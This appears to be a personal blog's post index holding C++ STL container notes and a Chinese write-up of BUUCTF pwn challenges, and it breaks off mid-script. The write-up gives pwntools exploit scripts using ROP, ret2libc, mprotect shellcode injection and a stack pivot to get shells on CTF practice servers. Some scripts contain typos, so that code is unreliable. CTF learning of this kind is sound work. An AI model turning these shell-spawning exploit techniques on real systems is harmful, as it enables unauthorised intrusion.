stack&lt;T&gt; 创建栈对象 push(element)：将元素压入栈顶 pop()：弹出栈顶元素 top()：返回栈顶元素 empty()：返回栈是否为空 size()：返回栈中元素的数量 清空栈操作： while (!myStack.empty()) &#123; myStack.pop(); &#125; queue queue &lt;int&gt; 创建queue对象 push(element)：将元素添加到队列的末尾 pop()：从队列的头部取出元素，并将其从队列中删除 front()：返回队列头部的元素，但不将其从队列中删除 back()：返回队列末尾的元素，但不将其从队列中删除 size()：返回队列中元素的数量 empty()：判断队列是否为空 priority_queue push(element)：将元素添加到优先队列中，根据优先级顺序排列。 pop()：从优先队列中取出优先级最高的元素，并将其从队列中删除。 top()：返回优先队列中优先级最高的元素，但不将其从队列中删除。 size()：返回优先队列中元素的数量。 empty()：判断优先队列是否为空 priority_queue&lt;int, std::vector&lt;int&gt;, std::less&lt;int&gt;&gt; myMaxHeap;创建大顶堆 less&lt;int&gt;是priority_queue的默认比较函数，因此在创建大顶堆时可以省略第三个参数。以下是更简洁的表达式：priority_queue&lt;int&gt; myMaxHeap; priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; myMinHeap; 创建小顶堆 priority_queue&lt;int, vector&lt;int&gt;,greater&lt;int&gt;&gt; 指定了使用greater&lt;int&gt; 作为比较函数，因此创建的优先队列是升序的，即优先级数值小的元素排在队列前面。如果想要创建降序的优先队列，可以使用 less&lt;int&gt; 作为比较函数，例如 priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt; EG: 优先队列实现滑动窗口求最大值 123456789101112131415161718192021222324252627282930int main() &#123; int k; // 滑动窗口大小 int n; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; nums(n); // 输入数组 priority_queue&lt;pair&lt;int, int&gt;&gt; pq; // 定义优先队列，存放数值和下标 for (int i = 0; i &lt; nums.size(); i++) cin &gt;&gt; nums[i]; // 先将前 k 个元素加入优先队列 for (int i = 0; i &lt; k; i++) &#123; pq.push(&#123; nums[i], i &#125;); &#125; // 输出第一个滑动窗口的最大值 cout &lt;&lt; pq.top().first &lt;&lt; &quot; &quot;; // 滑动窗口向右移动，每次加入一个新元素，弹出一个旧元素 for (int i = k; i &lt; nums.size(); i++) &#123; pq.push(&#123; nums[i], i &#125;); // 加入新元素 while (pq.top().second &lt;= i - k) &#123; // 弹出旧元素 pq.pop(); &#125; cout &lt;&lt; pq.top().first &lt;&lt; &quot; &quot;; // 输出当前滑动窗口的最大值 &#125; return 0;&#125; deque push_back(element)：在队尾插入一个元素。 pop_back()：删除队尾元素。 push_front(element)：在队头插入一个元素。 pop_front()：删除队头元素。 front()：返回队头元素，但不删除。 back()：返回队尾元素，但不删除。 empty()：如果队列为空，返回true，否则返回false。 size()：返回队列中元素的个数。 heap make_heap(first, last)：将[first, last)区间内的元素转换为堆。 push_heap(first, last)：将[first, last-1)区间内的元素插入堆中。 pop_heap(first, last)：将堆顶元素移动到[last-1]位置，并重新构建堆。 sort_heap(first, last)：将[first, last)区间内的元素排序，使其满足堆的性质。 is_heap(first, last)：如果[first, last)区间内的元素满足堆的性质，返回true，否则返回false。 push()：将元素添加到堆中。 pop()：从堆中移除根节点元素。 top()：返回堆中的根节点元素。 empty()：检查堆是否为空。 size()：返回堆中元素的数量。 STL中，堆是通过vector容器实现的，因此要声明一个堆对象，需要先声明一个vector容器，然后使用make_heap()函数将其转换为堆 不如手搓 pairtemplate&lt;class T1, class T2&gt; struct pair;其中，T1和T2表示两个不同的类型。std::pair类包含了两个公有成员变量first和second，分别表示这两个值。可以通过以下方式创建和访问std::pair对象： 编译器并不会对std::vector&lt;std::pair&lt;int, int&gt;&gt;中的元素顺序进行任何假设或者判断。它只会根据你的代码中对这个std::vector对象的使用来确定元素顺序。 例如，如果你在代码中使用v[i].first来访问第i个元素的第一个元素，编译器就会认为第一个元素表示数值，第二个元素表示下标。如果你使用v[i].second来访问第i个元素的第二个元素，编译器就会认为第一个元素表示下标，第二个元素表示数值。 迭代器类型补充在C++中，STL容器的迭代器可以分为5种类型，分别是： 输入迭代器（Input Iterator）：只读，只能单向移动，每个元素只能被访问一次。例如istream_iterator。 输出迭代器（Output Iterator）：只写，只能单向移动，每个元素只能被赋值一次。例如ostream_iterator。 前向迭代器（Forward Iterator）：可读写，只能单向移动，每个元素可以被访问或赋值多次。例如forward_list。 双向迭代器（Bidirectional Iterator）：可读写，可以双向移动，每个元素可以被访问或赋值多次。例如list。 随机访问迭代器（Random Access Iterator）：可读写，可以随机访问，支持加减运算，可以跳跃式访问容器中的元素。例如vector、deque。 因此，可以根据迭代器的类型来判断容器是否支持随机访问。以下是一些常见的STL容器及其迭代器类型： vector：支持随机访问迭代器。 deque：支持随机访问迭代器。 list：支持双向迭代器。 forward_list：支持前向迭代器。 set：支持双向迭代器。 map：支持双向迭代器。 unordered_set：支持前向迭代器。 unordered_map：支持前向迭代器。 迭代器类型的不同，使得for循环的操作写法不同 支持随机访问的可以使用熟悉的写法，对元素进行操作；不支持的如双向迭代器要对迭代器进行操作 需要注意的是，对于容器的不同操作，可能需要不同类型的迭代器。例如，对于list容器，如果需要在容器中间插入或删除元素，需要使用双向迭代器；而如果只是进行遍历，可以使用前向迭代器。 而且，要注意的是 stack是STL中的一个容器适配器，它并不是一个容器，因此没有迭代器。stack只提供了很少的操作，主要包括push()、pop()、top()、empty()和size()等方法，这些方法都是直接对栈顶元素进行操作，不需要使用迭代器来遍历栈中的元素。因此，stack并不属于任何一种迭代器类型。 STL对于空间大小的规定STL（标准模板库）中的容器分为两类： 顺序容器（Sequence Containers）：这些容器按照元素在容器中的位置来组织和存储元素。顺序容器包括vector、deque、list、forward_list、array。 vector、deque、array需要在创建容器对象时指定容器的大小，因为它们使用连续的内存存储元素，所以需要预先分配足够的内存空间。 list、forward_list不需要指定容器大小，它们使用链表存储元素，可以动态地分配和释放内存。 关联容器（Associative Containers）：这些容器按照元素的键值来组织和存储元素。关联容器包括set、multiset、map、multimap。 关联容器不需要在创建容器对象时指定容器的大小，它们使用树形结构存储元素，可以动态地分配和释放内存。 此外，还有另一种容器叫做stack和queue，它们是容器适配器（Container Adaptors），是在顺序容器的基础上提供了特定的接口，使其按照一定的规则进行操作。stack和queue都是基于顺序容器实现的，但是它们不需要指定容器的大小，因为它们使用的是顺序容器的默认构造函数，自动创建一个空的容器对象。 总之，顺序容器中的vector、deque和array需要指定容器大小，而list和forward_list不需要。关联容器和容器适配器都不需要指定容器大小。","categories":[{"name":"notes","slug":"notes","permalink":"http://lmarch2.github.com/categories/notes/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://lmarch2.github.com/tags/C/"}]},{"title":"远古BUUCTF的wp","slug":"远古BUUCTF的wp","date":"2023-08-28T14:37:09.000Z","updated":"2024-01-31T02:55:05.299Z","comments":true,"path":"posts/de339b6d/","link":"","permalink":"http://lmarch2.github.com/posts/de339b6d/","excerpt":"搬运，BUUCTF的pwn部分题解 not_the_same_3dsctf_2016 0X01 0x02 ciscn_2019_n_8 get_started_3dsctf_2016 0x00 0x01 0x02 0x03 0x04 ciscn_2019_c_1 0x01 0x02 0x03 0x04 0x05 [OGeek2019]babyrop 0x01 0x02 0x03 0x04 ciscn_2019_es_2 0x01 0x02 第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址 第二步 栈迁移 0x03 0x04 铁人三项(第五赛区)_2018_rop pwn2_sctf_2016 0x01 0x02 bjdctf_2020_babyrop 0x01 0x02 [HarekazeCTF2019]baby_rop2 0x01 0x02 jarvisoj_fm ciscn_2019_s_3 0x01 0x02 0x03 第一种做法：ret2csu控制执行execve 第二种：SROP","text":"搬运，BUUCTF的pwn部分题解 not_the_same_3dsctf_2016 0X01 0x02 ciscn_2019_n_8 get_started_3dsctf_2016 0x00 0x01 0x02 0x03 0x04 ciscn_2019_c_1 0x01 0x02 0x03 0x04 0x05 [OGeek2019]babyrop 0x01 0x02 0x03 0x04 ciscn_2019_es_2 0x01 0x02 第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址 第二步 栈迁移 0x03 0x04 铁人三项(第五赛区)_2018_rop pwn2_sctf_2016 0x01 0x02 bjdctf_2020_babyrop 0x01 0x02 [HarekazeCTF2019]baby_rop2 0x01 0x02 jarvisoj_fm ciscn_2019_s_3 0x01 0x02 0x03 第一种做法：ret2csu控制执行execve 第二种：SROP not_the_same_3dsctf_20160X01和get_started_3dsctf_2016类似 大概思路是先控制程序流到get_secret函数读取flag到f14g变量，再控制返回地址为write函数输出f14g变量的内容 123456789101112from pwn import *p = remote(&quot;node4.buuoj.cn&quot;,25684)elf= ELF(./not_the_same_3dsctf_2016)write_addr = elf.sym[&#x27;write&#x27;]flag_addr = 0x080ECA2D get_secret = 0x080489A0payload=&#x27;a&#x27;* 0x2d + p32(get_secret) + p32(write_addr) + p32(0) + p32(1) + p32(flag_addr) + p32(45)p.sendline(payload)p.interactive() 0x02第二种思路 用mprotect函数修改.plt.got表内存页权限为可读可写可执行，用read函数将shellcode注入到刚才修改的内存页中，执行shellcode 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *sh = remote(&quot;node4.buuoj.cn&quot;,25684)elf= ELF(./not_the_same_3dsctf_2016)pop3_ret = 0x0804f420#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参 #ROPgadget --binary get_started --only &#x27;pop|ret&#x27; | grep pop#为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.mem_addr = 0x80eb000 #可读可写的内存,但不可执行mem_size = 0x1000 #通过调试出来的值mem_proc = 0x7 #可代表可读可写可执行mprotect_addr = elf.symbols[&#x27;mprotect&#x27;]read_addr = elf.symbols[&#x27;read&#x27;]&#x27;&#x27;&#x27;为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.&#x27;&#x27;&#x27;payload = &#x27;A&#x27; * 45 #填充数据覆盖到ebppayload += p32(mprotect_addr) #栈返回到mprotect()函数执行payload += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12#mprotect 的三个参数 mprotect(0x080ea000,0x1000,0x7)payload += p32(mem_addr) #mprotect函数参数1 修改的内存地址payload += p32(mem_size) #mprotect函数参数2 修改的内存大小payload += p32(mem_proc) #mprotect函数参数3 修改的权限payload += p32(read_addr) #执行完pop3_ret后弹到read地址payload += p32(pop3_ret) #执行完read后将返回到pop3_ret指令,又继续使esp+12#read 的三个参数 read(0,0x080ea000,0x100)payload += p32(0) #read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址payload += p32(mem_addr) #读取到的内容复制到指向的内存里payload += p32(0x100) #读取大小payload += p32(mem_addr) #执行完read后ret esi，这里是返回到我们布置的shellcode执行sh.sendline(payload)payload_shellcode = asm(shellcraft.sh(),arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;) sh.sendline(payload_shellcode)sh.interactive() ciscn_2019_n_8 只需要满足var[13] == 17即可getshell；__isoc99_scanf()&#96;函数没有限制输入数据的长度 exp 1234567from pwn import *context(log_level=&#x27;debug&#x27;)sh = remote(&#x27;node4.buuoj.cn&#x27;,25951)payload = &#x27;a&#x27;*4*13 + p32(17) #p32(17)=\\x11\\x00\\x00\\x00,16进制小端存储，0x11(16)=17(10)#这里*4是因为4字节的数组每一项要4字节才能填满，*13是把数组前13项填满，第14项用sh.sendlineafter(&quot;What&#x27;s your name?\\n&quot;,payload)sh.interactive() get_started_3dsctf_20160x00最近持续学习栈溢出，努力熟悉各种利用方法，争取这周和下周把栈溢出这块结束 0x01IDA分析 &#96;&#96; 方法一：传统栈溢出 可以看到main函数并没有ebp，寻址方式是esp寻址 get_flag函数中，在读取flag之前先经过if判断a1 &#x3D;&#x3D; 814536271 &amp;&amp; a2 &#x3D;&#x3D; 425138641 构造pay时不可以试图跳过这个判断，无法打通 返回地址一定要覆盖为get_flag函数的开始处 在栈上构造get_flag参数 payload &#x3D; b’a’ * 0x38+p32(get_flag_addr)+p32(exit_addr)+p32(a1)+p32(a2) 注意这里的返回地址为exit的地址，打远程时，如果程序是异常退出了，最后是不给你回显的。所以我们得想办法让程序正常退出 EXP1 123456789101112from pwn import *context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)#p = process(&#x27;./get_started_3dsctf_2016&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,25669)get_flag_addr = 0x080489A0exit_addr = 0x804E6A0a1 = 0x308CD64Fa2 = 0x195719D1payload = b&#x27;a&#x27; * 0x38+p32(get_flag_addr)+p33(exit_addr)+p32(a1)+p32(a2)p.sendline(payload)p.interactive() 0x02方法二：系统调用 利用ROPgadget找到需要的gadget pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 但是没有找到”&#x2F;bin&#x2F;sh”字符串，考虑在其他寄存器写入&#x2F;bin&#x2F;sh，再赋值给edx 看看有没有类似的mov指令 mov_edx_eax_ret = 0x080557ab 你猜猜我mov_edx_eax_ret怎么找的（裂开） 可以看到，该处指令mov [edx], eax 是将eax寄存器里的值写到eedx所存的地址处[edx]，攻击的思路就是讲[edx]地址覆盖为&#x2F;bin&#x2F;sh写入地址，并利用eax寄存器将字符串&#x2F;bin&#x2F;sh存入。 需要注意的是，该程序没有给出可用的bss段变量，栈空间一般情况下开启ASLR地址随机，所以我们用vmmap查找可读的内存空间作为入&#x2F;bin&#x2F;sh的地址 这篇参考的链接，使用0x080eb020 作为存放&#x2F;bin&#x2F;sh的地址，但是使用vmmap可以看到没有以这个地址开头或结束的段，而且也不存在可写可执行的段，只有0x80ea000到0x80ec000是可写的文件段（实际上0x080eb020 也在该段中） 补充一下，同时其实我们可以看出来vmmap出来的地址段是没有libc中的内容的，实际上get_started_3dsctf_2016是静态链接 整体的rop流程为，分两次每次四字节将”&#x2F;bin” “&#x2F;sh\\x00”先存入eax，再利用Pop将edx置为0x80ea000，再利用mov指令将字符串放入该地址指向空间，最后返回系统调用 1234567891011121314151617181920from pwn import *local = 0if local == 1: io = process(&#x27;./get_started_3dsctf_2016&#x27;)else: io = remote(&#x27;node4.buuoj.cn&#x27;,25878)pop_eax_ret = 0x080b91e6pop_edx_ecx_ebx_ret = 0x0806fc30int80 = 0x0806d7e5mov_edx_eax_ret = 0x080557abw_addr = 0x80ea000#0x080eb020payload = b&#x27;a&#x27;*56+p32(pop_eax_ret)+b&#x27;/bin&#x27;+p32(pop_edx_ecx_ebx_ret)+p32(w_addr)+p32(0)+p32(0)+p32(mov_edx_eax_ret)payload += p32(pop_eax_ret)+b&#x27;/sh\\x00&#x27;+p32(pop_edx_ecx_ebx_ret)+p32(w_addr+4)+p32(0)+p32(0)+p32(mov_edx_eax_ret)payload += p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(w_addr)+p32(int80)io.sendline(payload)io.interactive()~ 0x03方法三：mprotect函数修改地址权限 利用mprotect()函数来修改内存权限，一般是将.bss端修改为可读可写可执行，然后通过read()函数向目标内存写入shellcode，然后getshell （因为是静态链接的，所有的函数都会链接到程序，肯定会存在一个mprotect（）函数 ） include &lt;sys&#x2F;mman.h&gt; int mprotect(void *addr, size_t len, int prot);addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB &#x3D;&#x3D; 4096字节）整数倍。 len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：1）PROT_READ：内存段可读；2）PROT_WRITE：内存段可写；3）PROT_EXEC：内存段可执行；4）PROT_NONE：内存段不可访问。返回值：0；成功，-1；失败（并且errno被设置）1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。3）ENOMEM：内核内部的结构体无法分配。这里的参数prot： r:4 w:2 x:1 我们通过vmmap可以看到0x080ea000到0x080ec000是可读可写但是不可执行的（开了NX保护），所以用mprotect()将这一段修改成可读可写可执行，然后通过read()传shellcode到此处 需要注意的是mprotect指定的内存区间必须包含整个内存页（4K），并且区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍（0x1000&#x3D;4096） 我们知道32位调用函数不需要寄存器传参，但是我们需要用pop，ret来控制程序运行流程， 用 ROPgadget 随便选一个有三个寄存器加一个ret的gadget 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *elf = ELF(&#x27;./get_started_3dsctf_2016&#x27;)sh = remote(&#x27;node4.buuoj.cn&#x27;,27364)#sh = process(&#x27;./get_started_3dsctf_2016&#x27;)context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27; , endian = &#x27;little&#x27;) #小端序，linux系统，32位架构,debugmprotect = 0x0806EC80buf_addr = 0x80eb000 #要修改的内存页首地址buf_size = 0x1000 #要修改的内存页大小buf_prot = 0x7 #要修改的权限pop_3_ret = 0x08063adb #寄存器传参外加ret返回read函数地址 #0x08063adb : pop edi ; pop esi ; pop ebx ; retmprotect_addr = elf.symbols[&#x27;mprotect&#x27;]read_addr = elf.symbols[&#x27;read&#x27;]read_addr = 0x0806E140payload = b&#x27;a&#x27;*0x38payload += p32(mprotect) #先将返回地址覆盖为mprotect函数地址payload += p32(pop_3_ret) #通过三个寄存器传参再加上ret返回栈上下一个函数地址payload += p32(buf_addr) #要修改的内存页首地址payload += p32(buf_size) #要修改的内存页大小payload += p32(buf_prot) #要修改的权限payload += p32(read_addr) #ret返回栈上下一个函数地址为read函数地址payload += p32(buf_addr) #read函数的返回地址payload += p32(0) #read函数的第一个参数payload += p32(buf_addr) #read函数的第二个参数payload += p32(0x100) #read函数的第三个参数sh.sendline(payload) shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;) sh.sendline(shellcode) #read函数输入buf_addr的字符串sh.interactive() 0x04参考文章 1 2 3 4 5 6 ciscn_2019_c_10x01简单的ret2libc3file checksec —— 64-bit 开NX 0x02运行一下看看 再看看IDA 研究了半天发现是让你加解密的再看看string window 没用system和binsh又发现加密函数里有gets函数，可构成栈溢出 0x03分析大致流程就是 利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本 用同一个程序里函数的地址-libc里的函数地址即可得到偏移量 得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘） 0x04写exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import*from LibcSearcher import*p=remote(&#x27;node4.buuoj.cn&#x27;,28342)elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)main=0x400b28pop_rdi=0x400c83ret=0x4006b9puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]p.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload=&#x27;\\0&#x27;+&#x27;a&#x27;*(0x50-1+8)payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.sendlineafter(&#x27;encrypted\\n&#x27;,payload)p.recvline()p.recvline()puts_addr=u64(r.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\0&#x27;))print hex(puts_addr)libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)offset=puts_addr-libc.dump(&#x27;puts&#x27;)binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)system=offset+libc.dump(&#x27;system&#x27;)p.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload=&#x27;\\0&#x27;+&#x27;a&#x27;*(0x50-1+8)payload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(binsh)payload+=p64(system)p.sendlineafter(&#x27;encrypted\\n&#x27;,payload)p.interactive() 0x05libcsearch的github网址安装 git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop 覆盖数据payload&#x3D;b’\\0’+b’a’*(0x50-1+8)\\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，buf的大小为0x50-1是减去\\0+8是覆盖rbp 这道题的接收非常讲究泄露地址接收时先是两下recvline()，原因 recvline()一次接收到\\n;第一次recvline只能到Ciphertext；第二次只能接收到0a第三次的recvuntil才开始处理泄露的got地址。先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。 然后再用recvuntil(‘\\n’)[:-1].ljust(8,’\\0’)来舍弃接收到的字符串最后的’\\x0’并向左补齐 这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了32位程序运行执行指令的时候直接去内存地址寻址执行64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序。因此要用寄存器存参 注意栈对齐 还有最后还要再输一个0 参考资料： [BUUCTF]PWN6——ciscn_2019_c_1 [OGeek2019]babyrop0x0164位程序，开启NX 没有system函数和&#x2F;bin&#x2F;sh字符串 0x02分析程序： main函数中，先读取一个随机数到fd，并作为参数传入sub_804871F函数，再将sub_804871F函数的返回值作为参数传入sub_80487D0函数里。 main函数 sub_804871F函数 sub_80487D0函数 观察程序我们可以发现sub_80487D0函数有栈溢出漏洞 然而想要利用栈溢出需要我们达成两个目标 1、绕过sub_804871F函数中的exit函数，这就要让strncmp的返回值为0 2、让sub_80487D0函数中a1（即buf[7]）的ASCII码值尽可能大，构造栈溢出 0x03首先第一步，我们知道，buf和s数组完全相等时，strncmp函数返回0，但是sprinf函数将随机数加到了s数组中，buf与s很难相等。不过在v1为0的时候strncmp函数也是会返回0的，而v1是读取的buf的大小，我们可以控制buf的第一位为’\\x00’，可起到截断字符串长度的效果。 第二步，若要利用栈溢出ret2libc泄露write函数地址的话，起码需要231+4+4*5 &#x3D; 255个字节，所以让buf[7] &#x3D; ‘\\xff’即可。代码中的buf[v5-1] &#x3D; 0改变的是字符串末尾’\\x00’的值，不影响buf[7] 。 所以第一次读取的payload为 1234payload = b&#x27;\\x00&#x27;+b&#x27;\\xff&#x27;*7p.sendline(payload)p.recvuntil(&quot;Correct\\n&quot;) 0x04注意本题提供了libc，直接使用pwntools工具即可，不必使用LibcSearcher main函数地址用elf.sym[‘main’]是找不到的，objdump -t命令查看发现程序没有符号表，原因应该是出题人使用strip命令去符号表了 完整exp 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from LibcSearcher import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,28188)#p = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;libc-2.23.so&#x27;)payload = b&#x27;\\x00&#x27;+b&#x27;\\xff&#x27;*7p.sendline(payload)p.recvuntil(&quot;Correct\\n&quot;)write_plt = elf.plt[&quot;write&quot;]write_got = elf.got[&quot;write&quot;]#main_addr = elf.plt[&#x27;__libc_start_main&#x27;]main_addr = 0x8048825payload1 = b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)p.sendline(payload1)write_addr = u32(p.recv(4))#print(hex(write_addr))libc_base = write_addr - libc.sym[&quot;write&quot;]system_addr = libc_base+libc.sym[&quot;system&quot;]bin_sh_addr=libc_base+libc.search(b&#x27;/bin/sh&#x27;).__next__()p.sendline(payload)p.recvuntil(&quot;Correct\\n&quot;)payload2 = b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(system_addr)+p32(0)+p32(bin_sh_addr)p.sendline(payload2)p.interactive() ciscn_2019_es_20x0132位开NX，有system函数，但是需要传入binsh。 然而，栈上变量 s 位于 ebp-0x28，而 read 函数仅能读入0x30个字节，那么若想实施缓冲区溢出，只有0x08 &#x3D; 0x30-0x28个字节供我们进行布局。因此，在只有 ebp 与 ret 能被篡改的条件下可尝试使用栈迁移。 程序存在leave ret指令，并且存在system函数可执行 而binsh则需要在栈上传入 So，我们最终要将 esp（与 ebp）劫持到当前栈的另一区域上，以完成传统栈溢出payload的实施 在本题中，劫持目标地址即为缓冲区变量 s 的起始地址 0x02第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址printf函数在未遇到”\\x00”时会一直输出，可以用来泄露出ebp的值 因为栈上地址间的相对位置是确定的，所以我们可以通过第二次输入的位置和泄露的ebp地址的偏移来定位我们的目标地址 在第二次输入read函数返回处下断点调试，计算可得泄露ebp与缓冲区起始位置相距0x38 第二步 栈迁移精心构造栈上的布局来实现栈迁移 0x03此处盗图，已标明 画栈图有助于理解整个流程 整个长条表示read读入的字节长度0x30，old_ebp表示泄露的ebp，减去0x38指向的就是变量s的起始位置，返回地址被覆盖为leav_ret的地址。 第一次自带的leave指令执行后，ebp的值为old_ebp - 0x38 ，esp指向篡改的返回地址leave_ret；接着执行ret指令pop eip再一次执行leave ret 第二次leave指令执行后，esp指向ebp+4也就是图中’aaaa’的下一位，ebp的值仍为old_ebp - 0x38 ；此时已经完成栈迁移。接下来ret指令将ebp+4弹入eip执行，所以在aaaa之后的地址需要放置我们的system函数和binsh binsh和其地址都可以在迁移过后的栈上布局 0x04exp 123456789101112131415161718192021222324252627from pwn import *p = remote(&quot;node4.buuoj.cn&quot;, 28160)system_addr = 0x08048400leave_ret = 0x080484b8payload1 = b&#x27;A&#x27; * (0x27) + b&#x27;B&#x27;p.send(payload1) # not sendlinep.recvuntil(&quot;B&quot;)original_ebp = u32(p.recv(4))print(hex(original_ebp))payload2 = b&#x27;aaaa&#x27; # for location, start of hijactionpayload2 += p32(system_addr)payload2 += b&#x27;dddd&#x27; # fake stack ebppayload2 += p32(original_ebp - 0x28) # addr of binshpayload2 += b&#x27;/bin/sh\\x00&#x27; # at ebp-0x28payload2 = payload2.ljust(0x28, b&#x27;p&#x27;)payload2 += p32(original_ebp - 0x38) # hijack ebp ,-0x38 is the aaaapayload2 += p32(leave_ret) # new leave retp.sendline(payload2)p.interactive() 参考博客 铁人三项(第五赛区)_2018_rop经典ret2libc3 exp 12345678910111213141516171819202122232425262728from pwn import * from LibcSearcher import * context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;) #p = process(&#x27;./pwn&#x27;) p = remote(&#x27;node4.buuoj.cn&#x27;,28146)elf = ELF(&#x27;./pwn&#x27;)main_addr = elf.sym[&#x27;main&#x27;]plt_addr = elf.plt[&#x27;write&#x27;] got_addr = elf.got[&#x27;write&#x27;]pay1 = b&#x27;a&#x27;*(0x88+4)+p32(plt_addr)+p32(main_addr)+p32(1)+p32(got_addr)+p32(0xD)p.sendline(pay1)write_addr = u32(p.recv()[0:4])#0xf7db1190print(&quot;write_addr = &quot;,hex(write_addr))libc=LibcSearcher(&#x27;write&#x27;,write_addr)offset=write_addr-libc.dump(&#x27;write&#x27;)binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)system=offset+libc.dump(&#x27;system&#x27;)print(&quot;libc_base_addr = &quot;,hex(offset))print(&quot;sys_addr = &quot;,hex(system))print(&quot;sh_addr = &quot;,hex(binsh))pay2 = b&#x27;a&#x27;*(0x88+4)+p32(system)+b&#x27;aaaa&#x27;+p32(binsh)p.sendline(pay2)p.interactive() pwn2_sctf_20160x0132位开NX泄露libc 注意get_n是自定义函数 规定读入v2长度的字符，但是程序要求v2不大于32。观察到int型的v2传入unsigned int型的a2，可以传入-1整数溢出绕过。 ROP链泄露libc，溢出覆盖返回地址getshell 0x02exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import * from LibcSearcher import * context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;) #p = process(&#x27;./pwn0&#x27;) p = remote(&#x27;node4.buuoj.cn&#x27;,26602)p.recvuntil(b&quot;How many bytes do you want me to read?&quot;)p.sendline(b&#x27;-1&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)elf = ELF(&#x27;./pwn0&#x27;) main_addr = elf.sym[&#x27;main&#x27;]plt_addr = elf.plt[&#x27;printf&#x27;] got_addr = elf.got[&#x27;getchar&#x27;]fmt = 0x080486Fpay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr)#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt)#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)p.recvuntil(b&quot;\\n&quot;)p.sendline(pay1)getchar_addr= u32(p.recvuntil(b&#x27;\\xf7&#x27;)[-4:])#getchar_addr = u32(p.recv()[0:4])变成接收前面四个字节了print(&quot;getchar_addr = &quot;,hex(getchar_addr))&#x27;&#x27;&#x27;libc=LibcSearcher(&#x27;getchar&#x27;,getchar_addr)offset=getchar_addr-libc.dump(&#x27;getchar&#x27;)binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)system=offset+libc.dump(&#x27;system&#x27;)&#x27;&#x27;&#x27;base_addr = getchar_addr - libc.symbols[&#x27;getchar&#x27;]system = libc.symbols[&#x27;system&#x27;] + base_addrbinsh = libc.search(b&#x27;/bin/sh&#x27;).__next__() + base_addrprint(&quot;libc_base_addr = &quot;,hex(base_addr))#print(&quot;libc_base_addr = &quot;,hex(offset))print(&quot;sys_addr = &quot;,hex(system))print(&quot;sh_addr = &quot;,hex(binsh))pay2 = 